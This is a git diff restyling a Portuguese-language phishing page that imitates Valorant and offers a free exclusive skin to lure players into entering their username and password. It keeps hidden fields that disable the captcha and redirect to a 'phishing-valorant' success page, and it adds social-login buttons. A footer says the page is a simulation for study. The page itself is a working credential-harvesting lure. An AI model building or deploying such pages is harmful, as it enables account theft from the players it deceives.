@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Valorant - Resgate sua Skin Exclusiva</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
 
     * {
       box-sizing: border-box;
@@ -14,46 +14,40 @@
 
     body {
       margin: 0;
-      background: linear-gradient(135deg, #e63946 0%, #1a1a1a 90%);
+      background: url('bg.jpg') no-repeat center center fixed;
       font-family: 'Roboto', sans-serif;
-      color: #f0f0f0;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      overflow: hidden;
     }
 
     .container {
-      background: #121212dd;
+      background: #fff;
       width: 360px;
       border-radius: 12px;
-      box-shadow: 0 0 25px #e63946;
-      overflow: hidden;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
+      padding: 0 0 20px 0;
       position: relative;
-      padding-bottom: 40px;
+      overflow: hidden;
     }
 
     .header {
-      background: url('Fundo-destaque-AsasOniricasValorant.jpg') no-repeat center/cover;
-      height: 140px;
+      background: #ff4655;
+      height: 100px;
       display: flex;
       justify-content: center;
       align-items: center;
-      position: relative;
-      text-shadow: 2px 2px 6px #000;
+      border-radius: 12px 12px 0 0;
     }
 
     .header h1 {
-      font-family: 'Orbitron', sans-serif;
-      font-size: 2rem;
+      font-size: 1.5rem;
       margin: 0;
-      color: #ff4655;
-      text-transform: uppercase;
+      color: #fff;
       letter-spacing: 2px;
-      background: rgba(0, 0, 0, 0.6);
-      padding: 0.3rem 1.2rem;
-      border-radius: 8px;
+      text-transform: uppercase;
+      font-weight: 700;
     }
 
     form {
@@ -66,63 +60,84 @@
       font-weight: 700;
       margin-bottom: 6px;
       font-size: 0.9rem;
-      color: #ff4655;
+      color: #000;
       text-transform: uppercase;
-      letter-spacing: 1.3px;
+      letter-spacing: 1px;
     }
 
     input[type="text"],
     input[type="password"] {
-      padding: 12px 15px;
+      padding: 12px;
       margin-bottom: 20px;
       border-radius: 8px;
-      border: none;
+      border: 1px solid #ccc;
       font-size: 1rem;
-      background: #222;
-      color: #eee;
-      transition: background 0.3s ease;
+      width: 100%;
+      background: #fafafa;
+      color: #222;
+      transition: border-color 0.3s ease;
     }
 
     input[type="text"]:focus,
     input[type="password"]:focus {
-      background: #2f2f2f;
+      border-color: #ff4655;
       outline: none;
     }
 
-    button {
+    button[type="submit"] {
       background: #ff4655;
       border: none;
-      padding: 14px;
+      padding: 12px;
       border-radius: 8px;
       font-weight: 700;
-      font-size: 1.1rem;
+      font-size: 1rem;
       color: white;
       cursor: pointer;
       transition: background 0.3s ease;
+      width: 100%;
+      margin-top: 10px;
       letter-spacing: 1.5px;
       text-transform: uppercase;
-      box-shadow: 0 0 10px #ff4655;
     }
 
-    button:hover {
+    button[type="submit"]:hover {
       background: #e63946;
-      box-shadow: 0 0 15px #e63946;
     }
 
-    .footer-note {
-      margin-top: 12px;
-      font-size: 0.8rem;
-      color: #ffa6a6;
-      text-align: center;
+    .social-login {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+      gap: 5px;
     }
 
-    /* Imagens de skins pequenas na lateral */
+    .social-login button {
+      background: #f0f0f0;
+      color: #000;
+      border: 1px solid #ccc;
+      flex-grow: 1;
+      padding: 10px 0;
+      border-radius: 6px;
+      font-weight: 700;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .social-login button:hover {
+      background: #e0e0e0;
+    }
+
     .skins {
       display: flex;
       justify-content: space-around;
       padding: 15px 0 0 0;
-      background: #1c1c1c;
-      border-top: 1px solid #333;
+      background: #fafafa;
+      border-top: 1px solid #eee;
+      margin-top: 20px;
     }
 
     .skins img {
@@ -131,14 +146,22 @@
       filter: drop-shadow(0 0 4px #ff4655);
       transition: transform 0.3s ease;
       cursor: default;
+      background: #fff;
+      padding: 4px;
     }
 
     .skins img:hover {
-      transform: scale(1.1);
+      transform: scale(1.08);
       filter: drop-shadow(0 0 8px #ff4655);
     }
 
-    /* Responsive */
+    .footer-note {
+      margin-top: 12px;
+      font-size: 0.8rem;
+      color: #ff4655;
+      text-align: center;
+    }
+
     @media(max-width: 400px) {
       .container {
         width: 90vw;
@@ -158,19 +181,18 @@
       <label for="senha">Senha</label>
       <input id="senha" type="password" name="senha" placeholder="••••••••••" required />
 
-      <!-- Redireciona para página sucesso -->
       <input type="hidden" name="_next" value="https://katielly-scherbatsky.github.io/phishing-valorant/sucesso.html" />
       <input type="hidden" name="_captcha" value="false" />
 
       <button type="submit" aria-label="Enviar formulário para resgatar skin Valorant">Resgatar Agora</button>
-    </form>
 
+    </form>
     <div class="skins" aria-label="Imagens de skins Valorant">
       <img src="valorant-elderflame-operator-variant-1-red-weapon-skin.png" alt="Skin Valorant 1" />
       <img src="valorant-prime-vandal-skin.png" alt="Skin Valorant Ares Reaver" />
       <img src="Glitchpop_Classic.webp" alt="Skin Valorant Spectre Prism" />
     </div>
-    <p class="footer-note">⚠️ Lembre-se: esta é uma simulação para estudo. Use senha falsa ou temporária.</p>
+    <div class="footer-note">⚠️ Lembre-se: esta é uma simulação para estudo. Use senha falsa ou temporária.</div>
   </div>
 </body>
 
